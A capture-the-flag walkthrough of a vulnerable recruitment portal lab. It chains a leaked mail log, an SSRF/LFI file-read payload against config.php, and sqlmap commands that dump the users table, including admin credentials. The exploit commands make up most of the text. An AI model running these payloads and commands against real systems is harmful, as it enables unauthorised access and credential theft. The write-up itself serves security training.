# Recruit — SSRF → LFI → SQL Injection → Admin Takeover

**Difficulty:** Easy/Medium
**Category:** Web Application Pentesting
**Techniques:** SSRF, Local File Inclusion, SQL Injection, Vulnerability Chaining

---

## Overview

Recruit is a vulnerable recruitment portal that simulates a real-world web application assessment. Multiple vulnerabilities must be chained together to escalate from an unauthenticated visitor to full administrative access, capturing two flags along the way.

**Attack chain:** `SSRF → LFI → SQL Injection → Admin Takeover`

---

## Step 1: Port Scanning

Started with a fast port scan using `rustscan` piped into `nmap` for service detection:

```bash
rustscan -a <TARGET_IP> -- -sC -sV
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 53   | DNS     | ISC BIND 9.16.1 |
| 80   | HTTP    | Apache 2.4.41 |

Three open ports, with the web application on port 80 being the primary attack surface.

---

## Step 2: Directory Enumeration

Used `feroxbuster` to discover hidden directories and files:

```bash
feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

Interesting paths discovered included `/mail`, `/api`, and `/assets`.

### Mail Log Disclosure

Navigating directly to:

```
http://<TARGET_IP>/mail/mail.log
```

revealed an internal email thread. The message explained that HR account credentials were temporarily stored in `config.php`, while admin credentials lived in the database.

This single misconfigured log file gave a clear roadmap for the next step.

---

## Step 3: Exploiting Local File Inclusion (LFI)

Reviewing the API documentation (linked from the login page) revealed an endpoint:

```
/file.php?cv=<URL>
```

This parameter was designed to fetch a candidate's CV from a remote URL — a classic **Server-Side Request Forgery (SSRF)** pattern that, when pointed at the local filesystem, becomes a **Local File Inclusion** primitive.

**Exploitation:**

```bash
curl "http://<TARGET_IP>/file.php?cv=file:///var/www/html/config.php"
```

This returned the raw source of `config.php`, exposing the HR account's plaintext password.

---

## Step 4: HR Login — First Flag

With the HR credentials in hand:

- **Username:** `hr`
- **Password:** *(extracted from `config.php`)*

Logging in granted access to the HR dashboard, where the **first flag (HR Flag)** was displayed.

---

## Step 5: Discovering SQL Injection

The candidate search field on the HR dashboard was tested with a single quote:

```
'
```

This produced a visible MySQL syntax error — a clear signal of an unsanitized SQL query.

**Likely backend query:**

```sql
SELECT * FROM candidates WHERE name LIKE '%input%'
```

---

## Step 6: Exploiting SQL Injection with sqlmap

### Confirming the injection and enumerating databases

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<session_cookie>" \
  --batch --dbs
```

**Databases found:**

```
information_schema, mysql, performance_schema, phpmyadmin, recruit_db, sys
```

### Enumerating tables in `recruit_db`

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<session_cookie>" \
  --batch -D recruit_db --tables
```

### Dumping the `users` table

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<session_cookie>" \
  --batch -D recruit_db -T users -C username,password --dump
```

**Extracted credentials:**

```
username: admin
password: admin@001admin
```

---

## Step 7: Admin Login — Second Flag

Logged out of the HR session and authenticated with the extracted admin credentials, gaining full access to the administrator dashboard — and the **second flag**.

---

## Vulnerability Summary

| Vulnerability | Impact |
|---|---|
| Information Disclosure | Leaked storage location of credentials via log file |
| SSRF / LFI | Exposure of sensitive server-side files |
| Hardcoded Credentials | Weak security practice (plaintext in config) |
| SQL Injection | Full database compromise |
| Broken Access Control | Privilege escalation to administrator |

---

## Key Takeaways

- **No single vulnerability led to full compromise.** It was the *chaining* of information disclosure, SSRF/LFI, and SQL injection that enabled complete takeover.
- **SSRF is often a pivot, not the end goal** — here it was used purely to achieve local file read.
- **SQL injection remains one of the most critical web vulnerabilities** when user input reaches the database layer unsanitized.
- Logging sensitive operational details (like where credentials are stored) in world-readable files is a serious but easily overlooked risk.
